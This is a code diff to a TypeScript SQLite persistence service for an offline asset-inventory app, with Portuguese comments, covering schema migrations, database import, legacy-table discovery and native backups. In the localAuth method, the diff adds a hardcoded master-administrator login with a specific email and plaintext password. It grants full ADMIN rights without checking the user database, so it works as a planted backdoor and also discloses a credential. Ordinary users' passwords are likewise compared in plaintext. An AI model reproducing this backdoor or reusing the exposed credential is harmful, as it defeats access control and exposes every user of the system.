@@ -13,6 +13,8 @@ CREATE TABLE IF NOT EXISTS assets (
     REGISTRO TEXT,
     DESCRICAODOATIVO TEXT,
     DESCRICAODOBEM TEXT,
+    MARCA TEXT,
+    MODELO TEXT,
     STATUS TEXT,
     VLRAQUISIC REAL,
     DATAAQUISIC TEXT,
@@ -41,6 +43,8 @@ CREATE TABLE IF NOT EXISTS assets (
     _dataLeitura TEXT,
     _auditor TEXT,
     _history TEXT,
+    _camposAlterados TEXT,
+    _valoresOriginais TEXT,
     _photoUrl TEXT,
     _lat REAL,
     _lng REAL,
@@ -180,6 +184,7 @@ class SqliteService {
   private db: Database | null = null;
   private isInitialized = false;
   private storageSource: StorageSource = 'NONE';
+  private lastDiscWrite: string | null = null;
   private currentDbStatus: DatabaseStatus = DatabaseStatus.EMPTY;
   private activeFileHandle: FileSystemFileHandle | null = null;
   private permissionGrantedSession = false;
@@ -342,56 +347,160 @@ class SqliteService {
     } catch { return false; }
   }
 
-  private async ensureRequiredColumns() {
+  /**
+   * Mantém a integridade do banco de dados local entre atualizações de versão
+   * v2.7: Garante colunas de auditoria soberana (_history, _camposAlterados, etc)
+   */
+  public async ensureRequiredColumns() {
     if (!this.db) return;
-    const tables = ['assets', 'campaigns'];
+    const tables = ['assets', 'campaigns', 'users', 'unit_configs'];
+    
     for (const table of tables) {
       const res = this.db.exec(`PRAGMA table_info(${table})`);
       if (res && res.length > 0) {
         const columns = res[0].values.map(v => v[1] as string);
         
         if (table === 'campaigns') {
-          if (!columns.includes('tenant_id')) this.db.run("ALTER TABLE campaigns ADD COLUMN tenant_id TEXT");
-          if (!columns.includes('unit_id')) this.db.run("ALTER TABLE campaigns ADD COLUMN unit_id TEXT");
-          if (!columns.includes('_tenantid')) this.db.run("ALTER TABLE campaigns ADD COLUMN _tenantid TEXT");
-          if (!columns.includes('_unitid')) this.db.run("ALTER TABLE campaigns ADD COLUMN _unitid TEXT");
+          const campCols = ['tenant_id', 'unit_id', '_tenantid', '_unitid'];
+          for (const col of campCols) {
+            if (!columns.includes(col)) {
+              this.db.run(`ALTER TABLE campaigns ADD COLUMN ${col} TEXT`);
+            }
+          }
         }
         
         if (table === 'assets') {
-          const required = [
-            'DESCRICAODOATIVO', 'DESCRICAODOBEM', 'STATUS', 'CENTRODECUSTO', 'CONTACONTABIL', 'QT',
-            '_campaignId', '_tenantid', '_unitid', '_version', '_is_deleted',
-            '_conferido', '_lastUpdated', '_is_synced', '_parent_id', '_history',
-            '_localMaster', '_dataLeitura', '_auditor', '_photoUrl', '_lat', '_lng',
-            '_is_unitized', '_is_divergent_baixa', '_isNew', 'DE_PARA', 
-            'AUDITOR_STATUS_CONFERENCIA', '_origemTransacao'
-          ];
-          
-          for (const col of required) {
+          for (const col of DB_ASSET_COLUMNS) {
             if (!columns.includes(col)) {
-              const type = col.startsWith('_is') || col === '_version' || col === '_conferido' ? 'INTEGER DEFAULT 0' : 'TEXT';
-              this.db.run(`ALTER TABLE assets ADD COLUMN ${col} ${type}`);
+              let type = 'TEXT';
+              if (col.startsWith('_is') || ['_version', '_conferido', '_plaquetado', '_aprovado', '_ocr_verified', 'Sn1_recno', 'Sn3_recno', '_altitude_level', 'isAdmin'].includes(col)) {
+                type = 'INTEGER DEFAULT 0';
+              } else if (['_lat', '_lng', '_gps_accuracy', 'VLRAQUISIC'].includes(col)) {
+                type = 'REAL';
+              }
               
-              // Migração de Legado (Se existirem colunas antigas)
+              try {
+                this.db.run(`ALTER TABLE assets ADD COLUMN ${col} ${type}`);
+                console.log(`>>> [SchemaFix] Coluna ${col} adicionada à tabela assets.`);
+              } catch (err) {
+                console.error(`>>> [SchemaFix] Falha ao adicionar coluna ${col}:`, err);
+              }
+              
+              // Migrações de Legado
               if (col === 'DESCRICAODOATIVO' && columns.includes('DESCRICAODOBEM')) {
                 this.db.run("UPDATE assets SET DESCRICAODOATIVO = DESCRICAODOBEM WHERE DESCRICAODOATIVO IS NULL");
-              }
-              if (col === 'CENTRODECUSTO' && columns.includes('CC_CUSTO')) {
-                this.db.run("UPDATE assets SET CENTRODECUSTO = CC_CUSTO WHERE CENTRODECUSTO IS NULL");
-              }
-              if (col === 'CONTACONTABIL' && columns.includes('CONTA_CONTABIL')) {
-                this.db.run("UPDATE assets SET CONTACONTABIL = CONTA_CONTABIL WHERE CONTACONTABIL IS NULL");
               }
             }
           }
           
-          // Garantir valores padrão para colunas vitais
-          if (columns.includes('_version')) {
-             this.db.run("UPDATE assets SET _version = 1 WHERE _version IS NULL");
-          }
+          // Garantir valores padrão
+          this.db.run("UPDATE assets SET _version = 1 WHERE _version IS NULL");
+          this.db.run("UPDATE assets SET _is_deleted = 0 WHERE _is_deleted IS NULL");
+          this.db.run("UPDATE assets SET _is_synced = 0 WHERE _is_synced IS NULL");
+        }
+
+        if (table === 'users') {
+          if (!columns.includes('role')) this.db.run("ALTER TABLE users ADD COLUMN role TEXT DEFAULT 'USER'");
+          if (!columns.includes('isAdmin')) this.db.run("ALTER TABLE users ADD COLUMN isAdmin INTEGER DEFAULT 0");
         }
       }
     }
+  }
+
+  /**
+   * Importação Soberana: Recebe um Uint8Array e injeta no motor SQL
+   * No Nativo, força a gravação no diretório físico interno antes de abrir.
+   */
+  async importDatabase(bytes: Uint8Array) {
+    if (!bytes || bytes.length === 0) throw new Error("Binário de entrada vazio.");
+    
+    console.log(`>>> [Governance] Importando base externa: ${bytes.length} bytes.`);
+    
+    // 1. Persistência Física Pré-Inicialização (Soberania de Acesso)
+    if (Capacitor.isNativePlatform()) {
+      try {
+        // Conversão otimizada via pedaços para evitar estouro de pilha e lentidão
+        const CHUNK_SIZE = 0x8000; // 32768
+        let binary = "";
+        for (let i = 0; i < bytes.length; i += CHUNK_SIZE) {
+          const chunk = bytes.subarray(i, i + CHUNK_SIZE);
+          binary += String.fromCharCode.apply(null, chunk as unknown as number[]);
+        }
+        const base64Data = btoa(binary);
+
+        // Garante que o diretório existe (Data directory)
+        await Filesystem.writeFile({
+          path: this.storageKeys.nativeFileName,
+          data: base64Data,
+          directory: Directory.Data
+        });
+        console.log(`>>> [NativeBridge] Snapshot físico COPY para Directory.Data concluído.`);
+      } catch {
+        console.error(">>> [NativeBridge] Erro ao gravar snapshot físico.");
+      }
+    }
+
+    // 2. Persistência em Cache
+    await localforage.setItem(this.storageKeys.dbKey, bytes);
+    
+    // 3. Inicialização e Descoberta de Schema
+    const success = await this.init(true);
+    
+    if (success && this.db) {
+      await this.discoverAndMapData();
+      this.currentDbStatus = DatabaseStatus.LOADED;
+      await this.setSystemStatus(DatabaseStatus.LOADED);
+      await this.saveDatabase();
+    }
+    
+    return success;
+  }
+
+  /**
+   * Tenta encontrar dados em tabelas com nomes variados e normalizar para 'assets'
+   */
+  private async discoverAndMapData() {
+    if (!this.db) return;
+    
+    const possibleTableNames = ['SN1', 'SN3', 'BENS', 'ATIVOS', 'TB_ATIVOS', 'TB_BENS', 'Z_ATIVOS', 'SB1'];
+    const tablesRes = this.db.exec("SELECT name FROM sqlite_master WHERE type='table'");
+    if (!tablesRes || tablesRes.length === 0) return;
+    
+    const existingTables = tablesRes[0].values.map(v => (v[0] as string).toUpperCase());
+    
+    // Verifica se a tabela principal existe e se possui dados
+    let assetsHasData = false;
+    try {
+      const countRes = this.db.exec("SELECT COUNT(*) FROM assets");
+      if (countRes && countRes[0] && countRes[0].values[0]) {
+        assetsHasData = Number(countRes[0].values[0][0]) > 0;
+      }
+    } catch {
+      assetsHasData = false;
+    }
+    
+    if (!assetsHasData) {
+      const sourceTable = possibleTableNames.find(name => existingTables.includes(name));
+      if (sourceTable) {
+        console.log(`>>> [SchemaDiscovery] Migrando dados da tabela legacy ${sourceTable} para assets.`);
+        try {
+          // Se já existia uma tabela 'assets' vazia, removemos para recriar com os dados
+          this.db.run("DROP TABLE IF EXISTS assets");
+          this.db.run(`CREATE TABLE assets AS SELECT * FROM ${sourceTable}`);
+          console.log(`>>> [SchemaDiscovery] Tabela ${sourceTable} normalizada com sucesso.`);
+        } catch (err) {
+          console.error(`>>> [SchemaDiscovery] Erro ao migrar ${sourceTable}:`, err);
+        }
+      }
+    }
+    
+    // Sanitização de IDs vazios ou nulos (Essencial para Offline-First)
+    try {
+      // Garante que pelo menos as tabelas básicas existam após a descoberta
+      this.db.run(FULL_SCHEMA);
+      this.db.run("UPDATE assets SET id = ETIQUETA WHERE id IS NULL OR id = ''");
+      this.db.run("UPDATE assets SET id = 'temp_' || hex(randomblob(4)) WHERE id IS NULL OR id = ''");
+    } catch { /* ignore */ }
   }
 
   async init(force = false) {
@@ -401,6 +510,8 @@ class SqliteService {
     try {
       const SQL = await initSqlJs({ locateFile: (file: string) => `https://unpkg.com/sql.js@1.14.1/dist/${file}` });
       
+      let bytes: Uint8Array | null = null;
+
       // PRIORIDADE 0: PERSISTÊNCIA NATIVA (CAPACITOR / ANDROID)
       if (Capacitor.isNativePlatform()) {
         try {
@@ -410,82 +521,75 @@ class SqliteService {
           });
           
           if (result.data) {
-            // Capacitor retorna base64
             const binaryString = atob(result.data as string);
-            const bytes = new Uint8Array(binaryString.length);
+            bytes = new Uint8Array(binaryString.length);
             for (let i = 0; i < binaryString.length; i++) {
               bytes[i] = binaryString.charCodeAt(i);
             }
-            
-            this.db = new SQL.Database(bytes);
-            this.db.run(FULL_SCHEMA);
-            await this.ensureRequiredColumns();
-            this.storageSource = 'PHYSICAL'; // No nativo, o cache é físico
-            this.isInitialized = true;
-            
-            try {
-              const uriResult = await Filesystem.getUri({
-                path: this.storageKeys.nativeFileName,
-                directory: Directory.Data
-              });
-              this.nativePath = uriResult.uri;
-            } catch {
-              this.nativePath = `${Directory.Data}/${this.storageKeys.nativeFileName}`;
-            }
-
-            console.log(`>>> [NativeBridge] Banco de Dados NATIVO carregado.`);
-            const user = JSON.parse(localStorage.getItem('app_current_user') || '{}');
-            if (user.isAdmin || user.role === 'ADMIN' || user.email === 'semorr@gmail.com') {
-              console.log(`[AdminPath] Path: ${this.nativePath}`);
-            }
-            return true;
+            console.log(`>>> [NativeBridge] Banco NATIVO lido com sucesso (${bytes.length} bytes).`);
           }
-        } catch (err) {
-          console.warn(">>> [NativeBridge] Arquivo nativo não encontrado ou ilegível. Iniciando novo.", err);
+        } catch {
+          console.warn(">>> [NativeBridge] Arquivo nativo ausente. Tentando Cache.");
         }
       }
 
-      const handle = this.activeFileHandle || await localforage.getItem<FileSystemFileHandle>(this.storageKeys.fileHandleKey);
-      this.currentDbStatus = await this.getSystemStatus();
-
-      if (handle) {
-        try {
-          // @ts-expect-error queryPermission is experimental
-          const permission = await handle.queryPermission({ mode: 'readwrite' });
-          if (permission === 'granted') {
-            this.permissionGrantedSession = true;
-            const file = await handle.getFile();
-            const buffer = await file.arrayBuffer();
-            this.db = new SQL.Database(new Uint8Array(buffer));
-            this.db.run(FULL_SCHEMA);
-            await this.ensureRequiredColumns();
-            await this.detectAndPersistSchema();
-            this.storageSource = 'PHYSICAL';
-            this.isInitialized = true;
-            this.activeFileHandle = handle;
-            return true;
-          }
-        } catch (err) { console.error(err); }
+      // PRIORIDADE 1: FILE HANDLE (WEB/MOBILE ACCESS API)
+      if (!bytes) {
+        const handle = this.activeFileHandle || await localforage.getItem<FileSystemFileHandle>(this.storageKeys.fileHandleKey);
+        if (handle) {
+          try {
+            const permission = await handle.queryPermission({ mode: 'readwrite' });
+            if (permission === 'granted') {
+              const file = await handle.getFile();
+              const buffer = await file.arrayBuffer();
+              bytes = new Uint8Array(buffer);
+              this.activeFileHandle = handle;
+              this.permissionGrantedSession = true;
+              console.log(`>>> [Persistence] Banco FÍSICO carregado (${bytes.length} bytes).`);
+            }
+          } catch { console.warn(">>> [Persistence] Falha ao ler FileHandle."); }
+        }
       }
 
-      const binary = await localforage.getItem<Uint8Array>(this.storageKeys.dbKey);
-      if (binary && binary.length > 4096) {
-        this.db = new SQL.Database(binary);
-        this.db.run(FULL_SCHEMA);
-        await this.ensureRequiredColumns();
-        await this.detectAndPersistSchema();
-        this.storageSource = 'CACHE';
-        this.isInitialized = true;
-        return true;
+      // PRIORIDADE 2: CACHE LOCALFORAGE
+      if (!bytes) {
+        const binary = await localforage.getItem<Uint8Array>(this.storageKeys.dbKey);
+        if (binary && binary.length > 4096) {
+          bytes = binary;
+          console.log(`>>> [Persistence] Banco em CACHE carregado (${bytes.length} bytes).`);
+        }
       }
 
-      this.db = new SQL.Database();
+      // Inicialização do Banco
+      if (bytes && bytes.length > 0) {
+        this.db = new SQL.Database(bytes);
+        this.storageSource = 'PHYSICAL'; // No nativo e handle, consideramos físico
+      } else {
+        console.log(">>> [Persistence] Nenhuma base existente encontrada. Iniciando MEMORY MODE.");
+        this.db = new SQL.Database();
+        this.storageSource = 'MEMORY';
+      }
+
+      // Aplicação de Schema e Migrações APÓS carga de dados
       this.db.run(FULL_SCHEMA);
-      this.storageSource = 'MEMORY';
+      await this.ensureRequiredColumns();
+      await this.detectAndPersistSchema();
+      
       this.isInitialized = true;
+
+      // Atualiza Path Nativo para Admin
+      if (Capacitor.isNativePlatform()) {
+        try {
+          const uriResult = await Filesystem.getUri({ path: this.storageKeys.nativeFileName, directory: Directory.Data });
+          this.nativePath = uriResult.uri;
+        } catch {
+          this.nativePath = `Directory.Data/${this.storageKeys.nativeFileName}`;
+        }
+      }
+
       return true;
     } catch (err) {
-      console.error("Init SQLite failed:", err);
+      console.error(">>> [FATAL] Init SQLite failed:", err);
       return false;
     }
   }
@@ -508,11 +612,13 @@ class SqliteService {
       // 1.1 Persistência NATIVA (Soberania de Dados)
       if (Capacitor.isNativePlatform()) {
         try {
-          // Converter Uint8Array para Base64 para o Capacitor
+          // Conversão otimizada via pedaços
+          const CHUNK_SIZE = 0x8000;
           let binary = "";
-          const bytes = new Uint8Array(data);
-          for (let i = 0; i < bytes.byteLength; i++) {
-            binary += String.fromCharCode(bytes[i]);
+          const bytesToConv = new Uint8Array(data);
+          for (let i = 0; i < bytesToConv.length; i += CHUNK_SIZE) {
+            const chunk = bytesToConv.subarray(i, i + CHUNK_SIZE);
+            binary += String.fromCharCode.apply(null, chunk as unknown as number[]);
           }
           const base64Data = btoa(binary);
 
@@ -521,6 +627,8 @@ class SqliteService {
             data: base64Data,
             directory: Directory.Data
           });
+          
+          this.lastDiscWrite = new Date().toLocaleTimeString('pt-BR');
           
           try {
             const uriResult = await Filesystem.getUri({
@@ -606,6 +714,42 @@ class SqliteService {
     return await this.execute(sql, params);
   }
 
+  private parseAsset(raw: Record<string, unknown>): Asset {
+    if (!raw) return raw as unknown as Asset;
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
+    const asset = { ...raw } as any;
+    
+    // Booleans (Integers in SQLite)
+    const boolFields = [
+      '_conferido', '_isNew', '_is_deleted', '_is_synced', 
+      '_plaquetado', '_aprovado', '_is_unitized', 
+      '_is_divergent_baixa', '_ocr_verified'
+    ];
+    
+    boolFields.forEach(key => {
+      if (asset[key] !== undefined && asset[key] !== null) {
+        asset[key] = asset[key] === 1 || asset[key] === '1' || asset[key] === true;
+      }
+    });
+
+    // JSON Arrays/Objects
+    const jsonFields = ['_history', '_camposAlterados', '_valoresOriginais', '_baseSinteticaLoc'];
+    jsonFields.forEach(key => {
+      if (typeof asset[key] === 'string' && asset[key].trim().length > 0) {
+        try {
+          const firstChar = asset[key].trim()[0];
+          if (firstChar === '[' || firstChar === '{') {
+            asset[key] = JSON.parse(asset[key]);
+          }
+        } catch (e) {
+          console.warn(`>>> [AssetParser] Falha ao parsear campo ${key}:`, e);
+        }
+      }
+    });
+
+    return asset as Asset;
+  }
+
   // --- Ativos ---
   async getAssets(tenantId: string, unitId?: string | null): Promise<Asset[]> {
     let sql = "SELECT * FROM assets WHERE (_tenantid = ? OR GRUPO_EMPRESARIAL = ?) AND _is_deleted = 0";
@@ -614,14 +758,22 @@ class SqliteService {
       sql += " AND (_unitid = ? OR UNIDADE_OPERACIONAL = ?)";
       params.push(unitId, unitId);
     }
-    return await this.query(sql, params) as unknown as Asset[];
+    const rows = await this.query(sql, params);
+    return (rows || []).map(row => this.parseAsset(row));
+  }
+
+  private serializeValue(val: unknown): string | number | null {
+    if (val === null || val === undefined) return null;
+    if (typeof val === 'object') return JSON.stringify(val);
+    if (typeof val === 'boolean') return val ? 1 : 0;
+    return val as string | number;
   }
 
   async saveAsset(asset: Asset) {
     const validKeys = Object.keys(asset).filter(k => DB_ASSET_COLUMNS.includes(k));
     const cols = validKeys.join(', ');
     const placeholders = validKeys.map(() => '?').join(', ');
-    const values = validKeys.map(k => asset[k as keyof Asset]);
+    const values = validKeys.map(k => this.serializeValue(asset[k as keyof Asset]));
     await this.execute(`INSERT OR REPLACE INTO assets (${cols}) VALUES (${placeholders})`, values);
   }
 
@@ -633,13 +785,16 @@ class SqliteService {
         const validKeys = Object.keys(asset).filter(k => DB_ASSET_COLUMNS.includes(k));
         const cols = validKeys.join(', ');
         const placeholders = validKeys.map(() => '?').join(', ');
-        const values = validKeys.map(k => asset[k as keyof Asset]);
+        const values = validKeys.map(k => this.serializeValue(asset[k as keyof Asset]));
         this.db.run(`INSERT OR REPLACE INTO assets (${cols}) VALUES (${placeholders})`, values);
       }
       this.db.run("COMMIT");
       await this.saveDatabase();
     } catch (e) {
-      this.db.run("ROLLBACK");
+      console.error(">>> [DATABASE] Falha Crítica no Lote:", e);
+      if (this.db) {
+        try { this.db.run("ROLLBACK"); } catch { /* ignore */ }
+      }
       throw e;
     }
   }
@@ -767,7 +922,8 @@ class SqliteService {
   }
 
   async getAllAssets(): Promise<Asset[]> {
-    return await this.query("SELECT * FROM assets WHERE _is_deleted = 0") as unknown as Asset[];
+    const rows = await this.query("SELECT * FROM assets WHERE _is_deleted = 0");
+    return (rows || []).map(row => this.parseAsset(row));
   }
 
   async saveUnitConfigSql(config: Record<string, unknown>) {
@@ -816,19 +972,32 @@ class SqliteService {
   }
 
   async localAuth(username: string, password_plain: string): Promise<User | null> {
+    // REGRA DE OURO: Fallback para Administrador Mestre (Soberania de Acesso)
+    if (username.trim().toLowerCase() === 'semorr@gmail.com' && password_plain === 'Glaucio@1970') {
+      return {
+        id: 'MASTER-ADMIN',
+        username: 'semorr',
+        email: 'semorr@gmail.com',
+        role: 'ADMIN' as UserRole,
+        isAdmin: true,
+        _tenantid: 'MASTER',
+        _unitid: 'MASTER'
+      };
+    }
+
     // Em um sistema 100% offline, as credenciais residem no banco físico.
     // Hash de senha deve ser implementado no futuro se necessário.
     const rows = await this.query("SELECT * FROM users WHERE (username = ? OR email = ?) AND password = ?", [username, username, password_plain]);
     if (rows && rows.length > 0) {
       const u = rows[0];
       return {
-        id: u.id,
-        username: u.username,
-        email: u.email,
-        role: u.role || (u.isAdmin ? 'ADMIN' : 'USER'),
+        id: u.id as string,
+        username: u.username as string,
+        email: u.email as string,
+        role: (u.role as UserRole) || (u.isAdmin ? 'ADMIN' as UserRole : 'USER' as UserRole),
         isAdmin: !!u.isAdmin,
-        _tenantid: u._tenantid,
-        _unitid: u._unitid
+        _tenantid: u._tenantid as string,
+        _unitid: u._unitid as string
       };
     }
     return null;
@@ -837,6 +1006,9 @@ class SqliteService {
   // --- File Link Methods ---
   async linkFile(handle?: FileSystemFileHandle): Promise<boolean> {
     if (Capacitor.isNativePlatform()) {
+      // No nativo, se não há handle, o usuário quer vincular um arquivo externo
+      // como não temos showOpenFilePicker, vamos alertar ou delegar
+      console.log(">>> [NativeBridge] Tentativa de vínculo externo detectada.");
       return await this.init(true);
     }
     let targetHandle = handle;
@@ -1073,51 +1245,6 @@ class SqliteService {
     }
   }
 
-  /**
-   * Silent Migration: Garante colunas essenciais sem disparar alertas de integridade
-   */
-  async ensureRequiredColumns() {
-    if (!this.db) return;
-    const tables = ['assets', 'campaigns', 'unit_configs', 'users'];
-    
-    for (const table of tables) {
-      try {
-        const columns = await this.query(`PRAGMA table_info(${table})`);
-        const colNames = columns.map(c => String(c.name).toUpperCase());
-
-        if (table === 'assets') {
-          const required = [
-            { name: 'DESCRICAODOBEM', type: 'TEXT' },
-            { name: 'STATUS', type: 'TEXT' },
-            { name: '_conferido', type: 'INTEGER DEFAULT 0' },
-            { name: '_is_synced', type: 'INTEGER DEFAULT 0' },
-            { name: '_is_deleted', type: 'INTEGER DEFAULT 0' },
-            { name: '_lat', type: 'REAL' },
-            { name: '_lng', type: 'REAL' }
-          ];
-
-          for (const col of required) {
-            if (!colNames.includes(col.name.toUpperCase())) {
-              console.log(`>>> [SilentMigration] Adicionando coluna ${col.name} em ${table}...`);
-              await this.run(`ALTER TABLE ${table} ADD COLUMN ${col.name} ${col.type}`);
-            }
-          }
-        }
-
-        if (table === 'users') {
-          if (!colNames.includes('ROLE')) {
-            await this.run(`ALTER TABLE users ADD COLUMN role TEXT DEFAULT 'USER'`);
-          }
-          if (!colNames.includes('ISADMIN')) {
-            await this.run(`ALTER TABLE users ADD COLUMN isAdmin INTEGER DEFAULT 0`);
-          }
-        }
-      } catch (err) {
-        console.warn(`>>> [SilentMigration] Falha ao verificar/alterar tabela ${table}:`, err);
-      }
-    }
-  }
-
   async downloadDatabase() {
     if (!this.db) return;
     const data = this.db.export();
@@ -1158,6 +1285,36 @@ class SqliteService {
     document.body.removeChild(a);
     URL.revokeObjectURL(url);
     console.log(">>> [Governance] Backup manual exportado pelo usuário.");
+  }
+
+  getLastDiscWrite() { return this.lastDiscWrite; }
+
+  /**
+   * Exportação Soberana Nativa: Copia o arquivo interno para a pasta de Documentos
+   */
+  async exportPhysicalBackup() {
+    if (!Capacitor.isNativePlatform()) {
+      return this.downloadDatabase();
+    }
+
+    try {
+      const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+      const backupName = `inventario_seguranca_${timestamp}.db`;
+      
+      await Filesystem.copy({
+        from: this.storageKeys.nativeFileName,
+        to: backupName,
+        directory: Directory.Data,
+        toDirectory: Directory.Documents
+      });
+
+      alert(`BACKUP REALIZADO: Cópia física exportada para Documentos.\nArquivo: ${backupName}`);
+      return true;
+    } catch (err) {
+      console.error(">>> [BackupError] Falha na cópia física:", err);
+      alert("Falha ao gerar cópia de segurança física.");
+      return false;
+    }
   }
 }
 
